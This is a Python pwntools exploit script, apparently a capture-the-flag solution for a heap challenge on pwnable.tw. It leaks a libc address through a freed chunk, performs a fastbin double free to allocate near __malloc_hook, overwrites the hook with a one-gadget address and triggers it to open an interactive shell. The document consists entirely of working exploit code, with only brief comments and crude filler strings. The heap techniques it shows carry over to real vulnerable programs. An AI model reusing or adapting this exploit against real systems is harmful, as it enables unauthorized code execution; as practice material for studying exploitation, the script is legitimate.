from pwn import *
context(arch = 'amd64', os = 'linux')

conn = remote('chall.pwnable.tw', 10203)

def Sendraw(s):
    conn.send_raw(s)


def Sendline(s):
    conn.sendline(s)


def RaiseFlower(name_size, name, color):
    Sendline('1')
    conn.read(),
    Sendline(str(name_size))
    conn.read(),
    Sendraw(name)
    conn.read(),
    Sendline(color)
    conn.readline(),

def VisitFlower():
    Sendline('2')
    lines = []
    while True:
        line = conn.readline()
        if line.find(b'of the flower') != -1:
            line = line.rstrip(b'\n')
            lines.append(line)
            print(line)
        else:
            print( line),
            break
    return lines

def RemoveFlower(i):
    Sendline('3')
    conn.read(),
    Sendline(str(i))
    

def ClearGarden():
    Sendline('4')
    

def ExitGarden():
    Sendline('5')
    

sleep(0.5)

# leak libc addr
conn.read(),
RaiseFlower(1024, b'fuck', b'fuck')
conn.read(),
RaiseFlower(1024, b'fuck', b'fuck')
conn.read(),
RemoveFlower(0)
conn.read(),
RaiseFlower(512, b'fuckfuck', b'fuck')
conn.read(),
recv = VisitFlower()[2]
libc_base_addr = u64(recv[recv.find(b'fuckfuck') + 8:].ljust(8, b'\x00')) - 0x3C3B78
libc_malloc_hook_addr = libc_base_addr + 0x3C3B10
log.info('libc_base_addr = 0x%016x' % libc_base_addr)
log.info('libc_malloc_hook_addr = 0x%016x' % libc_malloc_hook_addr)

# clear
conn.read(),
RemoveFlower(1)
conn.read(),
RemoveFlower(2)
conn.read(),
ClearGarden()

# Fast-bin attack
# 0x68 = 0x78 - 0x10
conn.read(),
RaiseFlower(0x68, b'fuck', b'fuck')   # 0
conn.read(),
RaiseFlower(0x68, b'fuck', b'fuck')   # 1
conn.read(),
RemoveFlower(1)
conn.read(),
RemoveFlower(0)
conn.read(),
RemoveFlower(1)
conn.read(),
RaiseFlower(0x68, pack(libc_malloc_hook_addr - 0x23, 64), b'fuck')   # 2
conn.read(),
RaiseFlower(0x68, b'fuck', b'fuck')   # 3
conn.read(),
RaiseFlower(0x68, b'fuck', b'fuck')   # 4
conn.read(),
RaiseFlower(0x68, b'A' * (0x23 - 0x10) + p64(libc_base_addr + 0xEF6C4), b'fuck')  # 5

# trigger malloc_hook
conn.read(),
RemoveFlower(0)
conn.read(),
Sendline('3')
conn.read(),
Sendline('0')
conn.interactive()